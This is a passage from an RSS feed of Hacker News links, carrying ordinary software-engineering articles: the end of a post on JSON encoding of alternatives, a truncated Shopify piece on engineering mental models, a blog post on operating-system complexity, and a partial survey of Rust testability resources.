not taken.<sup id="fnref:interesting-failure-mode"><a href="#fn:interesting-failure-mode">7</a></sup></p>

<div><div><pre><code>{ "ok": { "balance": 210 }, "error": null }
{ "ok": null, "error": "Unauthorized" }
</code></pre></div></div>

<p>The branch not chosen is sometimes present, sometimes omitted as if it
were an optional field:</p>

<div><div><pre><code>{ "ok": { "balance": 210 } }
{ "error": "Unauthorized" }
</code></pre></div></div>

<p>Sometimes, an array of a label and a value is used:</p>

<div><div><pre><code>[ "ok", { "balance": 210 } ]
[ "error", "Unauthorized" ]
</code></pre></div></div>

<p>Sometimes, the shape of the data is sufficient to distinguish among
the alternatives, and the label is left implicit:</p>

<div><div><pre><code>{ "balance": 210 }
"Unauthorized"
</code></pre></div></div>

<p>JSON itself does not offer any guidance for which of these options to
choose. In many real cases on the web, poor choices have led to
encodings that are irrecoverably ambiguous.</p>

<!-- Heading to visually offset the footnotes from the main document: -->
<h2 id="notes">Notes</h2>






</div>]]>
            </description>
            <link>https://preserves.gitlab.io/preserves/why-not-json.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946268</guid>
            <pubDate>Fri, 30 Oct 2020 19:56:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Mental Models of Ideas That Don't Change]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24946220">thread link</a>) | @oedmarap
<br/>
October 30, 2020 | https://shopify.engineering/building-mental-models | <a href="https://web.archive.org/web/*/https://shopify.engineering/building-mental-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p><b><i>I hope these mental models are as valuable for you as they are for me. I‚Äôll be presenting these ideas at ShipIt! Presents: Building Mental Models of Ideas That Don‚Äôt Change on October 28, 2020 at 1 pm EST (</i></b><a href="#ShipIt"><b><i>sign up here</i></b></a><b><i>). I‚Äôll go over the process of prioritizing new ideas and coming up with a system of models for yourself to organize these ideas. If you found this useful, stay updated by following me on </i></b><a href="https://twitter.com/Hammadk" target="_blank" title="Hammadk on Twitter" rel="nofollow noopener noreferrer"><b><i>Twitter</i></b></a><b><i>.</i></b></p>
<p>There‚Äôs always new stuff: new frameworks, new languages, and new platforms. All of this adds up. Sometimes it feels like you‚Äôre just treading water, and not actually getting better at what you do. I‚Äôve tried spending more time learning this stuff, but that doesn‚Äôt work‚Äîthere‚Äôs always more. I have found a better approach is learning things at a deeper level and using those lessons as a checklist. This checklist of core principles are called mental models.&nbsp;</p>
<p>I learned this approach by studying how bright people think. You might have heard Richard Feynman describe the handful of algorithms that he applies to everything. Maybe you‚Äôve&nbsp; seen Elon Musk describe his approach as thinking by fundamental principles. Charlie Munger also credits most of his financial success to mental models. All of these people are amazing and you won‚Äôt get to their level with mental models alone, but mental models give you a nudge in the right direction.</p>
<p>So, how does one integrate mental models into their life and work? The first thing that you need is a method for prioritizing new concepts that you should learn. After that, you‚Äôll need a good system for keeping track of what you have identified as important.&nbsp;With this process, you‚Äôll identify mental models and use them to make more informed decisions. Below I start by describing some engineering and management mental models that I have found useful over the years.</p>

<p><a href="#EngineeringModels">Engineering Mental Models</a></p>

<p>&nbsp;<a href="#ManagementModels">Management Mental Models</a></p>



<h2 id="Silent">Avoid Silent Failures</h2>
<p>When something breaks you should hear about it. This is important because small issues can help you find larger structural issues. Silent failures typically happen when exceptions are silenced‚Äîthis may be in a networking library, or the code that handles exceptions. Failures can also be silent when one of your servers is down. You can prevent this by using a third party system that pings each of the critical components.</p>
<p>As your project gets more mature, set up a dashboard to track key metrics and create automated alerts. Generally, computers should tell you when something is wrong. Systems become more difficult to monitor as they grow. You want to measure and log everything at the beginning and not wait until something goes wrong. You can encourage other developers to do this by creating helper classes with a really simple APIs since things that are easy and obvious are more likely to be used. Once you are logging everything, create automated alerts. Post these alerts in shared communication channels, and automatically page the oncall developer for emergencies.</p>
<h2 id="MinimalUpfront">Do Minimal Upfront Work and Queue the Rest</h2>
<p>A system is scalable when it handles unexpectedly large bursts of incoming requests. The faster your system handles a request, the faster it gets to the next one. Turns out, that in most cases, you don‚Äôt have to give a response to the request right away‚Äîjust a response indicating you've started working on the task. In practice, you queue a background job after you receive a request. Once your job is in a queue, you have the added benefit of making your system fault tolerant since failed jobs can be tried again.</p>
<h2 id="ScalingReads">Scaling Reads with Caching and Denormalizing</h2>
<p>Read-heavy systems mean some data is being read multiple times. This can be problematic because your database might not have enough capacity to deal with all of that work. The general approach of solving this is by pre-computing this data (called denormalizing) and storing it somewhere fast. In practice, instead of letting each request hit multiple tables in a database, you pre-compute the expected response and store it in a single place. Ideally, you store this information somewhere that‚Äôs really fast to read from (think RAM). In practice this means storing data in data stores like Memcached.</p>
<h2 id="ScalingWrites">Scaling Writes with Sharding, NoSQL Datastore, or Design Choices</h2>
<p>Write-heavy systems tend to be difficult to deal with. Traditional relational databases can handle reads pretty well, but have trouble with writes. They take more time processing writes because relational databases spend more effort on durability and that can lock up writes and create timeout errors.</p>
<p>Consider the scenario where a relational database is at it‚Äôs write-capacity and you can‚Äôt scale up anymore. One solution is to write data to multiple databases. Sharding is the process where you split your database into multiple parts (known as shards). This process allows you to group related data into one database. Another method of dealing with a write heavy system is by writing to Non-relational (NoSQL) databases. These databases are optimized to handle writes, but there‚Äôs a tradeoff. Depending on the type of NoSQL database and its configuration, it gives up:</p>
<ul>
<li>atomic transactions (they don‚Äôt wait for other transactions to fully finish),&nbsp;</li>
<li>consistency across multiple clusters (they don‚Äôt wait for other clusters to have the same data),</li>
<li>durability (they don‚Äôt spend time writing to disk).&nbsp;</li>
</ul>
<p>It may seem like you are giving up a lot, but you mitigate some of these losses with design choices.&nbsp;</p>
<p>Design choices help you cover some of the weaknesses of SQL databases. For example, consider that updating rows is much more expensive than creating new rows. Design your system so you avoid updating the same row in multiple flows‚Äîinsert new rows to avoid lock contention. With all of that said, I recommend starting out with a SQL database, and evolving your setup depending on your needs.</p>
<h2 id="HorizontalScaling">Horizontal Scaling Is the Only Real Long Term Solution</h2>
<p>Horizontal scaling refers to running your software on multiple small machines, while vertical scaling refers to running your software on one large machine. Horizontal scaling is more fault tolerant since failure of a machine doesn‚Äôt mean an outage. Instead, the work for the failed machine is routed to the other machines. In practice, horizontally scaling a system is the only long term approach to scaling. All systems that appear ‚Äòinfinitely-scalable‚Äô are horizontally scaled under the hood: Cloud object stores like S3 and GCS; NoSQL databases like Bigtable and Dynamo DB; and stream processing systems like Kafka are all horizontally scaled. The cost for horizontally scaling systems is application and operational complexity. It takes significant time and potential complexity to horizontally scale your system, but you want to be in a situation where you can linearly scale your system by adding more computers.</p>
<h2 id="HardTest">Things That are Harder to Test Are More Likely to Break</h2>
<p>Among competing approaches to a problem, you should pick the most testable solution (this is my variant of Occam‚Äôs Razor). If something is difficult to test, people tend to avoid testing it. This means that future programmers (or you) will be less likely to fully test this system, and each change will make the system more brittle. This model is important to remember when you first tackle a problem because good testability needs to be baked into the architecture. You‚Äôll know when something is hard to test because your intuition will tell you.</p>
<h2 id="RootCause">Antifragility and Root Cause Analysis</h2>
<p>Nassim Taleb uses the analogy of a hydra in Antifragile; they grow back a stronger head every time they are struck. The software industry championed this idea too. Instead of treating failures as shameful incidents that should be avoided at all costs, they‚Äôre now treated as opportunities to improve the system. Netflix‚Äôs engineering team is known for Chaos Monkey, a resiliency system that turns off random components. Once you anticipate random events, you can build a more resilient system. When failures do happen, they‚Äôre treated as an opportunity to learn.</p>
<p>Root cause analysis is a process where the people involved in a failure try to extract the root cause in a blameless way by starting off by what went right, and then diving into the failure without blaming anyone.</p>
<h2 id="BigO">Big-O and Exponential Growth</h2>
<p>The Big-O notation describes the growth in complexity of an algorithm. There‚Äôs a lot to this, but you‚Äôll get very far if you just understand the difference between constant, linear, and exponential growth. In layman‚Äôs terms, algorithms that perform one task are better than algorithms that perform many tasks, and algorithms that perform many tasks are better than ones where the tasks are ever increasing with each iteration. I have found this issue visible at an architectural level as well.</p>
<h2 id="MarginSafety">Margin of Safety</h2>
<p>Accounting for a margin of safety means you need to leave some room for errors or exceptional events. For example, you might be tempted to run each server at 90% of its capacity. While this saves money, it leaves your server vulnerable to spikes in traffic. You‚Äôll have more confidence in your setup, if you have auto-scaling setup. There‚Äôs a problem with this too, your overworked server can cause cascading failures in the whole system. By the time auto-scaling kicks in, the new server may have a disk, connection pool or an assortment of other random fun issues. Expect the unexpected and give yourself some room to breathe. Margin of safety also applies to planning releases of new software. You should add a buffer of time because unexpected things will come up.</p>
<h2 id="PublicAPI">Protect the Public API</h2>
<p>Be very careful when making changes to the public API. Once something is in the public API, it‚Äôs difficult to change or remove. In practice, this means having a very good reason for your changes, and being extremely careful with anything that affects external developers; mistakes in this type of work affect numerous people and are very difficult to revert.</p>
<h2 id="Redundancy">Redundancy</h2>
<p>Any system with many moving parts should be built to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/building-mental-models">https://shopify.engineering/building-mental-models</a></em></p>]]>
            </description>
            <link>https://shopify.engineering/building-mental-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946220</guid>
            <pubDate>Fri, 30 Oct 2020 19:51:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Complexity in Operating Systems]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24945856">thread link</a>) | @fcambus
<br/>
October 30, 2020 | https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html | <a href="https://web.archive.org/web/*/https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Over the last years I‚Äôve been working on very different operating
systems. Operating systems are usually incredibly complex beasts. I
think there are mainly three drivers of this complexity. Surprisingly
enough, neither of these is having to deal with hardware.</p>

<p>The first one is resource <strong>discovery</strong>, i.e. figuring out how the
computer the OS is running on actually looks like. On x86, this
involves parsing countless bitfields, tables, executing byte code
provided by the firmware, probing individual features, etc. The most
painful example of this I‚Äôve seen so far is figuring out which
interrupt a particular PCI interrupt line is routed to. It‚Äôs worth a
set of posts, but until then, feel free to checkout <a href="https://habr.com/en/post/501912/">this
description</a>. (If it‚Äôs down, it‚Äôs
also cached by
<a href="https://webcache.googleusercontent.com/search?q=cache:CXZUV61m7hwJ:https://habr.com/en/post/501912/+&amp;cd=1&amp;hl=en&amp;ct=clnk">Google</a>.)</p>

<p>The second issue is <strong>resource management</strong>. Essentially, how do you
hand out and eventually reclaim all the resources you discovered. For
some workloads performance matters here, so this code is usually
written with speed in mind.</p>

<p>The third reason is that at compile time the <strong>workload</strong> is
unclear. So the kernel has to assume the worst. It must be ready to
start a couple of hundred VMs or create a thousand TCP sockets in a
blink of an eye, because there is no way to know what‚Äôs going to
happen or what the actual requirements are.</p>

<p>A fun exercise is to checkout the <a href="https://elixir.bootlin.com/linux/v5.9.1/source/virt/kvm/kvm_main.c#L739">KVM code for creating
VMs</a>. Try
to follow
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/x86.c#L9904">the</a>
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/vmx/vmx.c#L7059">code</a>
to where the actual VM is created in hardware. <em>Spoiler:</em> There is
none. It‚Äôs all figuring out what the platform can do and then setting
up a bunch of spinlock, mutexes, lists, arrays, structs, ‚Ä¶</p>

<p>I don‚Äôt want to pick on KVM in particular. I think it‚Äôs pretty ok as
far as Linux kernel code goes. Operating System kernel code is mostly
like this: A lot of really mind numbing platform discovery and
resource management code written for speed assuming the worst case
requirements in a language that doesn‚Äôt do parsing, resource
management or concurrency well (among other things).</p>

<p>People take this all for granted. But when I look around, I see many
systems that don‚Äôt need this complexity and where it is only a safety
and security burden. Consider most appliance-type products, e.g. a
Wi-Fi router. Or a system that runs one service on a cloud VM. You
know everything in advance!</p>

<p>If you read until this point, you are probably asking yourself, where
I am going with this. If you think <a href="https://en.wikipedia.org/wiki/Separation_kernel">separation
kernel</a>, you are
right. My rough plan to write a couple of more posts to flesh out the
idea of doing all the complicated OS parts at compile time and how
this results in an incredibly simple, secure, and efficient system at
runtime. There will be <a href="https://riscv.org/">RISC-V</a>,
<a href="https://www.haskell.org/">Haskell</a>, <a href="https://dhall-lang.org/">Dhall</a>,
and <a href="https://www.rust-lang.org/">Rust</a> content.</p>

<p>Stay tuned.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945856</guid>
            <pubDate>Fri, 30 Oct 2020 19:20:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust Design-for-Testability: A Survey]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945657">thread link</a>) | @matt_d
<br/>
October 30, 2020 | https://alastairreid.github.io/rust-testability/ | <a href="https://web.archive.org/web/*/https://alastairreid.github.io/rust-testability/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>What can we do when designing Rust code to make it easier to test?
This is a survey of everything I could find<sup id="fnref:survey-method" role="doc-noteref"><a href="#fn:survey-method">1</a></sup> about
testing Rust with a particular focus on design for testability for
correctness.  Some of the articles show multiple things to do on a
worked example, some are more focused on a particular trick.</p>

<p>There doesn‚Äôt seem to be a single place that describes all the testing
ideas: it is scattered across book chapters, blog articles, medium
articles, etc. but here are the main sources that I have found.</p>

<ul>
  <li><a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">The Rust book</a> chapter on testing</li>
  <li><a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing command line applications in Rust</a>
(significant overlap with the <a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>)</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>
Probably the most exhaustive / thorough</li>
  <li><a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync at Dropbox</a> ‚Äì
what they did in their Rust rewrite to improve testability</li>
  <li><a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example book</a> chapter on testing</li>
  <li><a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a> ‚Äì
John Regehr‚Äôs blog (not specifically about Rust)</li>
  <li><a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></li>
  <li><a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a></li>
  <li><a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">How to use the Rust compiler as your integration testing framework</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: Testing</a> (collection of links)</li>
  <li><a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP) Rust code</a></li>
  <li><a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: testing tools/libraries</a></li>
  <li><a href="https://martinfowler.com/articles/practical-test-pyramid.html">A practical test pyramid</a> ‚Äì Martin Fowler‚Äôs blog (not specifically about Rust)</li>
</ul>

<p>I am not going to try to summarize what these sources say: the rest of
this post is a list of some common / interesting topics and which of
these sources describe it in more detail.</p>

<p>Although my main focus is on how to write Rust programs so that they are easy
to test, I touch on the other half of the problem: how to do the testing.</p>

<p><em>[I am new to Rust and my own testing habits are somewhat ad-hoc so this is
definitely not a recommendation of how to write software by me.  I hope it is
useful and that you will tell me what I have missed
<a href="https://twitter.com/alastair_d_reid">on twitter</a> or
<a href="mailto:alastair.d.reid@gmail.com">by email</a>
so that I can update this post.
I would love to hear about any team that has published recommendations for
design-for-testability.]</em></p>

<h2 id="design-techniques-for-improving-testability">Design techniques for improving testability</h2>

<p>The sources listed above have a bunch of common suggestions that I
explore in more detail below. Many of the sources I found have great
discussions so I will not try to repeat their explanations in this
document but will link to some of the better discussions of each idea
that I found.</p>

<h3 id="use-intermediate-data-structures">Use intermediate data structures</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">use the Rust compiler for integration testing</a></p>

<ul>
  <li>Use intermediate data structures to separate deciding what to do
from performing the action: allowing tests to check that the right
decision is being made and avoiding the need to mock/fake the
filesystem, etc.</li>
  <li>Aggressively use newtypes, structs, enums</li>
  <li>Parse and validate inputs early (eg convert strings to enums)</li>
  <li>Also, #[must_use], parse/validate early</li>
  <li><a href="https://sans-io.readthedocs.io/how-to-sans-io.html">Writing I/O-Free (Sans-I/O) Protocol Implementations</a> (not Rust specific)</li>
</ul>

<h3 id="abstract-testable-code-into-separate-functions">Abstract testable code into separate functions</h3>

<p>See:
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a></p>

<ul>
  <li>Cleanly separate command line parsing from code that implements functionality</li>
</ul>

<h3 id="abstract-io-and-state-side-effects-out-of-functions">Abstract I/O and state side effects out of functions</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a>,
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a></p>

<ul>
  <li>Use of std::io::Write trait and writeln! instead of println! (and handle resulting potential error)</li>
</ul>

<h3 id="avoid--reduce-non-determinism">Avoid / reduce non-determinism</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li>Use Futures with a custom executor to eliminate the
non-determinism of threads</li>
  <li>All randomized testing systems should be fully deterministic
and easily reproducible</li>
  <li>Beware of additional randomness in libraries:
e.g., Rust‚Äôs HashMap uses randomized hashing to protect against denial of service attacks.
This makes testing harder.</li>
  <li>Determinism enables minimization of random tests
(cf. <a href="https://altsysrq.github.io/proptest-book/proptest/tutorial/shrinking-basics.html">proptest</a>)</li>
</ul>

<h3 id="defining-correct-behavior">Defining correct behavior</h3>

<p>See:
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li><a href="https://blog.regehr.org/archives/856">Oracles for random testing</a> (not Rust specific)
    <ul>
      <li>Use Function inverse pairs (eg print/parse functions)</li>
      <li>Compare two implementations</li>
    </ul>
  </li>
  <li>Use asserts liberally</li>
  <li><a href="https://doc.rust-lang.org/nightly/unstable-book/compiler-flags/sanitizer.html">Turn on sanitizers</a></li>
  <li><a href="https://docs.rs/contracts/0.6.0/contracts/">Contracts.rs</a>
/ <a href="https://crates.io/crates/contracts">(crates.io link)</a> ‚Äì code contract library</li>
  <li>[inactive?] <a href="https://github.com/nrc/libhoare">libhoare</a> compiler plugin</li>
</ul>

<h3 id="dependency-injection-and-mock-testing">Dependency injection and mock testing</h3>

<p>See:
<a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></p>

<ul>
  <li>Abstraction can be based on Higher order functions or objects</li>
  <li>Traits and <a href="https://github.com/asomers/mockall">mockall</a></li>
  <li>Module mocks using <a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://github.com/Mcat12/shaku">shaku</a> is a compile-time dependency injection library that works well with mockall</li>
</ul>

<h3 id="api-design">API design</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>,
<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use Unsafe, ‚Ä¶</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design</a>,
<a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP)</a></p>

<p>API design strongly affects testability of that API</p>

<ul>
  <li>The component should provide a stable contract composed of traits, structs, and enums</li>
  <li>Always implement Clone and fmt::Debug for public types
    <ul>
      <li>types like failure::Error should be converted to something that is cloneable</li>
    </ul>
  </li>
  <li>
    <p>Use ‚Äònewtype‚Äô to let the type system statically test for errors and use
one of these to test that this is done correctly</p>

    <ul>
      <li><a href="https://github.com/laumann/compiletest-rs">compiletest.rs</a>
for testing Rust compilations</li>
      <li><a href="https://github.com/dtolnay/trybuild">trybuild</a>
for testing error messages (eg from proc-macros)</li>
      <li><a href="https://crates.io/crates/lang_tester/">lang_tester</a>
for testing compilations including, but not limited to, Rust</li>
      <li>the fuzzy text matcher <a href="https://crates.io/crates/fm">fm</a></li>
    </ul>
  </li>
  <li>Use #![warn(missing_doc_code_examples)]
(and other <a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>)</li>
</ul>

<h2 id="writing-tests">Writing tests</h2>

<p>See:
<a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example</a>,</p>

<p>Having structured your software to enable tests, there are a lot of
different tools and libraries to support writing tests.</p>

<ul>
  <li>Documentation tests</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a></li>
  <li><a href="https://rust-fuzz.github.io/book/">Fuzzing book</a> describes use of
    <ul>
      <li><a href="https://rust-fuzz.github.io/book/cargo-fuzz.html">cargo-fuzz</a></li>
      <li><a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a></li>
      <li><a href="https://crates.io/crates/arbitrary">arbitrary</a></li>
    </ul>

    <p>See: <a href="https://github.com/rust-fuzz">Rust Fuzzing Authority</a></p>
  </li>
  <li>Use a generative testing / property-based testing crate such as
    <ul>
      <li><a href="https://docs.rs/quickcheck">QuickCheck</a>
        <ul>
          <li>has its own
<a href="https://docs.rs/quickcheck/0.9.2/quickcheck/trait.Arbitrary.html">arbitrary implementation</a></li>
        </ul>
      </li>
      <li><a href="https://docs.rs/proptest">proptest</a>
        <ul>
          <li>has its own
<a href="https://docs.rs/proptest-arbitrary/0.2.2/proptest_arbitrary/">arbitrary implementation</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Unit tests vs integration tests</li>
  <li>Using <a href="https://docs.rs/assert_cmd">assert_cmd</a> crate to test applications
(link has links to other useful crates)</li>
  <li>Better error reporting using one of
    <ul>
      <li><a href="https://docs.rs/anyhow/1.0.33/anyhow/">anyhow crate</a> ‚Äì adding context to error messages</li>
      <li><a href="https://docs.rs/color-eyre/0.5.6/color_eyre/">color eyre crate</a> ‚Äì
extends anyhow with .suggestion() and other context</li>
    </ul>
  </li>
  <li>Use the {:?} and {:x?} Debug string formats in test harnesses
(see <a href="https://doc.rust-lang.org/std/fmt/#formatting-traits">std/fmt</a>)</li>
  <li><a href="https://github.com/jakubadamw/rutenspitz">Rutenspitz</a>:
procedural macros for testing (fuzzing) equivalence of two
stateful models (e.g., data structures)</li>
</ul>

<h3 id="test--behavior-driven-design-tdd-and-bdd">Test / Behavior driven design (TDD and BDD)</h3>

<p>See: <a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a>,
<a href="https://mateuscosta.me/testing-between-java-and-rust">From @test to #[test]: Java to Rust</a></p>

<p>Obviously, there are many, many articles about TDD, BDD, Agile, etc.
in the context of Java and other OO languages. The following links are
Rust specific but they are a bit random and need to be improved.</p>

<ul>
  <li><a href="https://crates.io/crates/laboratory">Laboratory.rs</a> ‚Äì
BDD-inspired test library (todo: are other BDD libraries maybe more popular?)</li>
  <li><a href="https://github.com/utkarshkukreti/speculate.rs">Speculate</a>
RSpec inspired testing library</li>
  <li>Fluent assertions: <a href="https://github.com/cfrancia/spectral">spectral</a>
(last updated 2017)</li>
  <li><a href="https://matthewkmayer.github.io/blag/public/post/tdd-with-rust/">TDD with Rust</a> (2017) ‚Äì
a small example</li>
  <li>Regression testing (testing against a golden reference) using one of
    <ul>
      <li><a href="https://docs.rs/qtrac-retest/4.0.6/retest/">Retest</a></li>
      <li><a href="https://github.com/mitsuhiko/insta">insta</a></li>
    </ul>
  </li>
</ul>

<h2 id="specific-topics">Specific topics</h2>

<p>Note: links in this section are more likely to be out of date.</p>

<h3 id="code-coverage">Code coverage</h3>

<ul>
  <li><a href="https://crates.io/crates/cov-mark">cov-mark crate</a> ‚Äì
adding explicit coverage annotations to code
(<a href="https://matklad.github.io/2018/06/18/a-trick-for-test-maintenance.html">blog</a>,
<a href="https://ferrous-systems.com/blog/coverage-marks/">blog</a>)</li>
  <li>Code coverage tools and crates
    <ul>
      <li><a href="https://github.com/mozilla/grcov">Grcov</a> ‚Äì Mozilla‚Äôs coverage tool</li>
      <li><a href="https://github.com/kennytm/cov">cargo-cov</a></li>
      <li><a href="https://crates.io/crates/cargo-tarpaulin">Tarpaulin</a> (x86 only)</li>
    </ul>
  </li>
  <li><a href="https://jbp.io/2017/07/19/measuring-test-coverage-of-rust-programs.html">Measuring test coverage of Rust programs</a>
(I think it is now easier than in 2017?)</li>
  <li><a href="https://sunjay.dev/2016/07/25/rust-code-coverage">Rust Code Coverage Guide: kcov + Travis CI + Codecov / Coveralls</a> (2016)</li>
</ul>

<h3 id="testing-embedded-systems">Testing embedded systems</h3>

<ul>
  <li><a href="https://ferrous-systems.com/blog/cargo-test-with-panic-probe/">Using <code>cargo test</code> for embedded testing with <code>panic-probe</code></a></li>
  <li><a href="https://ferrous-systems.com/blog/defmt/">defmt, a highly efficient Rust logging framework for embedded devices</a>:
a deferred formatting library that encodes I/O over a hardware trace port to reduce binary size on embedded systems</li>
  <li><a href="https://medium.com/@ericdreichert/test-setup-and-teardown-in-rust-without-a-framework-ba32d97aa5ab">Test setup/teardown without a framework</a> ‚Äì
using <a href="https://doc.rust-lang.org/std/panic/fn.catch_unwind.html">panic::catch_unwind</a></li>
  <li><a href="https://github.com/rust-lang/rfcs/blob/master/text/2318-custom-test-frameworks.md">RFC 2318: Custom test frameworks</a> ‚Äì
<a href="https://doc.rust-lang.org/beta/unstable-book/language-features/custom-test-frameworks.html">now in unstable</a></li>
  <li><a href="https://os.phil-opp.com/testing/">Writing an OS in Rust: testing</a> (uses custom test frameworks)</li>
  <li><a href="https://github.com/japaric/utest">Utest</a> (is this still active?)</li>
</ul>

<h3 id="concurrency-futures-and-async">Concurrency, futures and async</h3>

<ul>
  <li><a href="https://blog.x5ff.xyz/blog/async-tests-tokio-rust/">Two easy ways to test async functions in Rust</a></li>
  <li><a href="https://rust-lang.github.io/async-book/09_example/03_tests.html">Async book ‚Äì testing a web server</a></li>
  <li><a href="https://crates.io/crates/tokio-test">Tokio-test</a> for mocking AsyncRead/Write and tasks
(<a href="https://docs.rs/tokio-test/0.3.0/tokio_test/index.html">docs</a>)</li>
  <li><a href="https://github.com/actix/examples/blob/master/hello-world/src/main.rs">actix async example</a></li>
  <li><a href="https://www.lpalmieri.com/posts/2020-08-09-zero-to-production-3-how-to-bootstrap-a-new-rust-web-api-from-scratch/#4-our-first-integration-test">Our first integration test</a> ‚Äì
Actix_rt::test based chapter in book <a href="https://zero2prod.com/">Zero to production in Rust (book)</a></li>
  <li><a href="https://crates.io/crates/loom">Loom</a> tests concurrent code by
running it many times with all possible thread interleavings</li>
</ul>

<h3 id="testing-frameworks">Testing frameworks</h3>

<ul>
  <li><a href="https://tech.labs.oliverwyman.com/blog/2019/01/14/serialising-rust-tests/">Serializing Rust tests</a>
(<a href="https://github.com/palfrey/serial_test">github</a>) ‚Äì
annotations to prevent some tests being run in parallel</li>
  <li><a href="https://github.com/budziq/rust-skeptic">Skeptic</a> ‚Äì
run doctest-like tests on README.md</li>
  <li><a href="https://github.com/Wmaxlees/trust">Trust automated test runner</a>: reruns tests when files change</li>
  <li><a href="https://crates.io/crates/test-case">Test-case</a>
procedural macro to generate tests from test-case annotations</li>
  <li><a href="https://github.com/vitiral/artifact">Artifact (aka RST)</a> ‚Äì
requirement tracking software where comments in code are linked (in lightweight way) to
requirements, specs and tests in a markdown document</li>
  <li><a href="https://github.com/cksac/fake-rs">Fake.rs</a> ‚Äì
interesting #derive option to describe how to generate fake values for structs.
Can this be adapted to specify invariants for legal values of a type?</li>
</ul>

<h3 id="testing-guis">Testing GUIs</h3>

<ul>
  <li><a href="https://gtk-rs.org/blog/2018/05/02/who-talked-about-testing.html">Gtk-rs testing</a>:
testing UIs by being able to send events to gtk and observe results</li>
  <li><a href="https://medium.com/snips-ai/dinghy-painless-rust-tests-and-benches-on-ios-and-android-c9f94f81d305">Dinghy: testing iOS and Android</a>:
challenges when you don‚Äôt have a command line</li>
</ul>

<h3 id="testing-apis">Testing APIs</h3>

<ul>
  <li><a href="https://github.com/laumann/compiletest-rs">Compiletest.rs</a> ‚Äì for testing compiler plugins and similar
    <ul>
      <li>In particular, checking that type system (etc) rejects misuse of APIs:
